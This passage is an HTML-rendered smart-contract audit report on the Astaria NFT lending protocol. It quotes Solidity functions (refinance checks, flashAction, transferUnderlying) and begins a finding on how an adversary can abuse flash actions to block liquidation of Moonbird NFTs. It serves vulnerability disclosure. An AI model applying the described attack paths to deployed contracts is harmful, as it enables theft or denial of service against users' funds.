class=\"mtk12\">end</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">EXPIRED_LIEN</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadLienStorageSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isValidVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidSender</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_buyoutLien</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">params</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Changing minInterestBPS, minDurationIncrease can impact ongoing loan’s refinance condition.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"152\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">isValidRefinance</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">ILienToken.Lien </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">ILienToken.Stack[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxNewRate</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minInterestBPS</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidRefinanceCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (</span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">maxNewRate</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">) ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> &gt;=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minDurationIncrease</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-52\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-52\" aria-label=\"recommended mitigation steps 52 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol take a snapshot of the parameter when the loan term is created and not let ongoing changed parameter setting affect the active loan which is not fair for both lender and borrower.</p>\n<h2 id=\"03-adversary-can-game-the-flashauction-feature-to-block-further-flashauction-after-trading-collateral-token-and-make-liquidatornftclaim-function-revert-and-block-liquidation-if-the-nft-is-moonbird\" style=\"position:relative;\"><a href=\"#03-adversary-can-game-the-flashauction-feature-to-block-further-flashauction-after-trading-collateral-token-and-make-liquidatornftclaim-function-revert-and-block-liquidation-if-the-nft-is-moonbird\" aria-label=\"03 adversary can game the flashauction feature to block further flashauction after trading collateral token and make liquidatornftclaim function revert and block liquidation if the nft is moonbird permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/70\">[03] Adversary can game the flashAuction feature to block further flashAuction after trading collateral token and make liquidatorNFTClaim function revert and block liquidation if the NFT is Moonbird</a></h2>\n<p>In the current implementation, according to <a href=\"https://docs.astaria.xyz/docs/protocol-mechanics/flashactions\">https://docs.astaria.xyz/docs/protocol-mechanics/flashactions</a></p>\n<blockquote>\n<p>FlashActions allow borrowers to take advantage of the utility of their locked NFTs. A FlashAction allows the user to unlock their underlying collateral and perform any action with the NFT as long as it is returned within the same block.</p>\n</blockquote>\n<p>The corresponding implementation is in CollateralToken.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"153\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">flashAction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IFlashAction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">getUnderlying</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">flashEnabled</span><span class=\"mtk1\">[</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FLASH_DISABLED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ACTIVE_AUCTION&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AUCTION_ACTIVE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preTransferState</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//look to see if we have a security handler for this asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">securityHooks</span><span class=\"mtk1\">[</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">preTransferState</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISecurityHook</span><span class=\"mtk1\">(</span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// transfer the NFT to the destination optimistically</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ClearingHouse</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">transferUnderlying</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//trigger the flash action on the receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">.</span><span class=\"mtk11\">onFlashAction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IFlashAction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">Underlying</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">], </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ) != </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;FlashAction.onFlashAction&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashActionCallbackFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">preTransferState</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">ISecurityHook</span><span class=\"mtk1\">(</span><span class=\"mtk12\">securityHook</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashActionSecurityCheckFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// validate that the NFT returned after the call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashActionNFTNotReturned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The code above did a few things: make sure the flashAction is enabled, make sure the NFT is not in auction, make sure owner the owner of the collateral token can call flashAction using onlyOwner(collateralId) modifier, then the code transfer the NFT to the receiver.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"154\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ClearingHouse</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">transferUnderlying</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>In the end, the code checks if the caller of the flashAction return the NFT by checking the ownership of the NFT</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"155\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashActionNFTNotReturned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>We need to look into ClearingHouse(s.clearingHouse[collateralId]).transferUnderlying function call:</p>\n<p>In ClearingHouse.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"156\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferUnderlying</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">IAstariaRouter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IAstariaRouter</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_getArgAddress</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">COLLATERAL_TOKEN</span><span class=\"mtk1\">()));</span></span></span>\n<span 